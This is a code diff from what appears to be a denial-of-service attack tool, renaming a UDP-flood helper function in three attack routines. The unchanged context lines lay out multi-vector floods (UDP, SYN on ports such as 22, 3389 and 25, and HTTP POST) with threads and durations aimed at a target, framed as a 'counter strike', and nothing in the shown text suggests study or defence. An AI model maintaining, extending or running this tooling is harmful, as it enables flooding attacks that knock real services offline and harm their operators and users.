@@ -36,7 +36,7 @@ def full_scale_counter_strike(target):
     print("[+] Preparing Network Layer vectors (UDP, SYN, ICMP)...")
     for port in [53, 443, 123]:  # UDP
         args = ("UDP-Mix", target, port, params["duration"], stop_event, pause_event, params["threads"])
-        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_UDP, args))
+        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_udp, args))
     for port in [80, 443, 22, 3389, 25, 587]:  # SYN
         args = (target, port, params["duration"], stop_event, pause_event, params["threads"])
         attack_threads.append(launch_attack_thread(counter_strike_helper.synflood, args))
@@ -82,7 +82,7 @@ def fast_scale_counter_strike(target):
     # Launch focused L3/L4 attacks
     for port in [53, 443]:  # UDP
         args = ("UDP-Mix", target, port, params["duration"], stop_event, pause_event, params["threads"])
-        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_UDP, args))
+        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_udp, args))
     for port in [80, 443, 22]:  # SYN
         args = (target, port, params["duration"], stop_event, pause_event, params["threads"])
         attack_threads.append(launch_attack_thread(counter_strike_helper.synflood, args))
@@ -125,8 +125,8 @@ def adaptive_strike(target):
 
     # Define the attack profile, now including the HTTP POST flood
     attack_profile = [
-        (counter_strike_helper.attack_UDP, ("UDP-Mix", target, 53, total_duration, stop_event, pause_event, threads)),
-        (counter_strike_helper.attack_UDP, ("UDP-Mix", target, 443, total_duration, stop_event, pause_event, threads)),
+        (counter_strike_helper.attack_udp, ("UDP-Mix", target, 53, total_duration, stop_event, pause_event, threads)),
+        (counter_strike_helper.attack_udp, ("UDP-Mix", target, 443, total_duration, stop_event, pause_event, threads)),
         (counter_strike_helper.synflood, (target, 80, total_duration, stop_event, pause_event, threads)),
         (counter_strike_helper.attack_http_post, (target, 80, total_duration, stop_event, pause_event, threads)),
         (counter_strike_helper.attack_http_post, (target, 443, total_duration, stop_event, pause_event, threads)),
